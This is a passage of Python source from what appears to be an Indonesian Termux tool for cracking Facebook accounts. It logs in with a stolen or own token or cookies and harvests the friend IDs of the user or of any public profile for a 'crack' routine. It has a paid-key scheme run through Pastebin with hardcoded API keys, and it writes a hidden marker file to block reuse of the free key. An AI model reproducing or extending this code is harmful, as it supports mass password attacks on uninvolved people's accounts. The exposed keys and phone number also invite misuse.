    print(f"{biru}[{putih}*{biru}]{putih} User Name :{hijau} {mama}")
    print(f"{biru}[{putih}*{biru}]{putih} User Ids  :{hijau} {ida}")
    print(f"{biru}[{putih}*{biru}]{putih} User Tipe :{hijau} {prem[0]}\n{garis}\n")
    print(f"[01] Crack Dari Daftar Teman")
    print(f"[02] Crack Dari Daftar Teman Publik")
    print(f"[03] Remove Token & Relogin")
    print(f"[00] Exciting this Program\n")
    tk_pilih(url)
def tk_pilih(url):
    p=input(f"{putih}[{hijau}?{putih}] Your Chose : {hijau}")
    if p == "":print(f"{putih}[{merah}×{putih}] Jangan Kosong Goblok");time.sleep(2);tk_pilih(url)
    elif p == "1" or p == "01":tk_tem(url)
    elif p == "2" or p == "02":tk_pub(url)
    elif p == "3" or p == "03":os.remove("token.json");masuk()
    elif p == "0" or p == "00":print(f"{putih}[{kuning}!{putih}] Good Bye Slur");sys.exit(2)
    else:print(f"{putih}[{merah}×{putih}] Your Chose Is Not Found");time.sleep(1);tk_pilih(url)
def tk_tem(url):
    ses=http(f"{url}/me/friends").json()
    try:
        for x in ses["data"]:
            ida=x["id"];nm=x["name"];id.append(f"{ida}|{nm}");print(f"\r{putih}[{hijau}#{putih}] Mengambil Id : {hijau}{len(id)}",end="");time.sleep(0.01)
        crack(url)
    except KeyError:print(f"\n{putih}[{merah}×{putih}] Tidak Ada Teman Yang Ditemukan");time.sleep(2);tk_menu(url)
def tk_pub(url):
    print(f"\n{garis}\n{biru}[{putih}*{biru}]{putih} Masukkan Id / username orang Lain\n{biru}[{putih}*{biru}]{putih} Pastikan Pengguna Itu Memiliki Teman\n{garis}\n")
    ids=input(f"{putih}[{hijau}?{putih}] User Id      :{hijau} ")
    try:ses=http(f"{url}/{ids}").json()["name"];print(f"{putih}[{hijau}#{putih}] User Name    :{hijau} {ses}")
    except KeyError:print(f"\n{putih}[{merah}×{putih}] Pengguna Tidak Ditemukan\n");time.sleep(2);tk_pub(url)
    ses=http(f"{url}/{ids}/friends").json()
    try:
        for x in ses["data"]:
            nm=x["name"];ida=x["id"];id.append(f"{ida}|{nm}");print(f"\r{putih}[{hijau}#{putih}] Mengambil Id :{hijau} {len(id)}",end="");time.sleep(0.01)
        crack(url)
    except KeyError:print(f"\n{putih}[{merah}×{putih}] Tidak Ada Teman Yang Ditemukan");time.sleep(2);tk_pub(url)
def suk():
    try:
        key=json.loads(open("user.json","r").read())["key"]
        try:ses=req.get(key.replace("sbf-","https://pastebin.com/raw/"))
        except requests.exceptions.ConnectionError:sys.exit(f"\n{putih}[{merah}×{putih}] Ssl Connection Error\n")
        if "Not Found (#404)" in ses.text:print(f"\n{putih}[{kuning}!{putih}] Key Tols Expired, Please Relogin");time.sleep(2);os.remove("user.json");regis()
        else:prem.append(ses.json()["Tipe"]);masuk()
    except FileNotFoundError:regis()
def masuk():
    os.system("clear");print(logo);print(garis)
    print(f"{biru}[{putih}*{biru}]{putih} Recomended Login Dengan CooKies")
    print(f"{biru}[{putih}*{biru}]{putih} Tiap Pilihan Isinya Berbeda\n{garis}\n")
    print("[01] Menu Login Token")
    print("[02] Menu Login CooKies")
    print("[00] Exciting This Program\n")
    polp()
def polp():
    p=input(f"{putih}[{hijau}?{putih}] Your Chose : {hijau}")
    if p == "":print(f"{putih}[{merah}×{putih}] Jangan Kosong Goblok");time.sleep(2);polp()
    elif p == "1" or p == "01":req.headers.update({"Host":"graph.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});tk_login("https://graph.facebook.com")
    elif p == "2" or p == "02":login("https://mbasic.facebook.com{}")
    elif p == "0" or p == "00":print(f"\n{putih}[{kuning}!{putih}] Good Bye Slur");sys.exit(2)
    else:print(f"{putih}[{kuning}!{putih}] Your Chose Is Not Found");time.sleep(1);polp()
def free():
    if os.path.isfile("/data/data/com.termux/files/usr/bin/.dpkgg"):print(f"\n{putih}[{merah}×{putih}] Kunci Gratis Hanya Berlaku Untuk Satu Kali Pakai\n");sys.exit(2)
    os.system("rm -fr user.json && clear");print(logo);print(f"{garis}\n{biru}[{putih}*{biru}] {putih}Cie Suka Yang Gratisan Ya Kamu\n{biru}[{putih}*{biru}] {putih}Masukin Nama Kamu Untuk Lanjut\n{garis}")
    file=input(f"{putih}[{hijau}?{putih}] Nama Kamu : {hijau}").replace(" ","")+".json"
    try:tod={"Tipe":"Gratisan"};ses=req.post("https://pastebin.com/api/api_post.php",data={"api_dev_key":"_el9FDxHxIHyvjeu6u9YbvAXwRsdWiMp","api_option":"paste","api_paste_code":json.dumps(tod),"api_paste_private":"0","api_paste_name":file,"api_paste_expire_date":"1D","api_paste_format":"json","api_user_key":"a933641206ea3350ab4eb10a1c24f046"}).text
    except requests.exceptions.ConnectionError:sys.exit(f"\n{putih}[{merah}×{putih}] SSL Connection Error\b")
    if "pastebin.com" in ses:sp=ses.replace("https://pastebin.com/","sbf-");sf={"key":sp};open("user.json","w").write(json.dumps(sf));open("/data/data/com.termux/files/usr/bin/.dpkgg","w").write("Terimakasih Sudah Decompile Script Ini");print(f"\n{garis}\n{biru}[{putih}*{biru}] {putih}Kunci Akan Aktif Selama Satu Hari\n{biru}[{putih}*{biru}] {putih}Selamat Bersenang-Senang Slur\n{garis}");time.sleep(7);suk()
    elif "pastebin.com" not in ses:print(f"\n{putih}[{merah}×{putih}] Terjadi Kesalahan Pada Server, Silahkan Coba Lagi Nanti\n");sys.exit(2)
def regis():
    os.system("clear");print(logo);print(garis)
    print(f"{biru}[{putih}*{biru}]{putih} Silahkan Pilih Salah satu\n{biru}[{putih}*{biru}]{putih} Untuk Yg Gratis Hanya Berlaku 1 Kali\n{garis}\n")
    print("[01] Mulai Dengan Gratis")
    print("[02] Mulai Dengan Berbayar")
    print("[00] Exciting This Program\n")
    maksud()
def bayar():
    os.system("clear");print(logo);print(garis)
    print(f"{biru}[{putih}*{biru}]{putih} Untuk Kunci Berbayar\n{biru}[{putih}*{biru}]{putih} Silahkan Chat Ke WhatsApp creator\n{biru}[{putih}*{biru}]{putih} WhatsApp {kuning}081210160358\n{garis}\n")
    key=input(f"{putih}[{hijau}?{putih}] Kunci Tools : {hijau}")
    if not "sbf-" in key:time.sleep(2);print(f"\n{putih}[{merah}×{putih}] Kunci Tools salah");time.sleep(2);bayar()
    else:url=key.replace("sbf-","https://pastebin.com/raw/")
    try:
        try:su=req.get(url).json()["Tipe"];prem.append(su);open("user.json","w").write(json.dumps({"key":key}));print(f"\n{putih}[{hijau}✓{putih}] Kunci Tools Benar\n");print(f"{garis}\n{biru}[{putih}*{biru}] {putih}Kunci Akan Aktif Sampai Script Modar\n{biru}[{putih}*{biru}] {putih}Selamat Bersenang-Senang Slur\n{garis}");time.sleep(7);masuk()
        except json.decoder.JSONDecodeError:print(f"\n{putih}[{merah}×{putih}] Kunci Tools salah");time.sleep(2);bayar()
    except requests.exceptions.ConnectionError:sys.exit(f"\n{putih}[{merah}×{putih}] Tidak Ada Koneksi Internet\n")
def maksud():
    p=input(f"{putih}[{hijau}?{putih}] Your Chose : {hijau}")
    if p == "":print(f"{putih}[{merah}×{putih}] Jangan Kosong Dong Goblok");maksud()
    elif p == "1" or p == "01":free()
    elif p == "2" or p == "02":bayar()
    elif p == "0" or p == "00":sys.exit(f"{putih}[{kuning}!{putih}] Good Bye Slur\n")
    else:print(f"{putih}[{merah}×{putih}] Pilihan {p} Tidak Ada")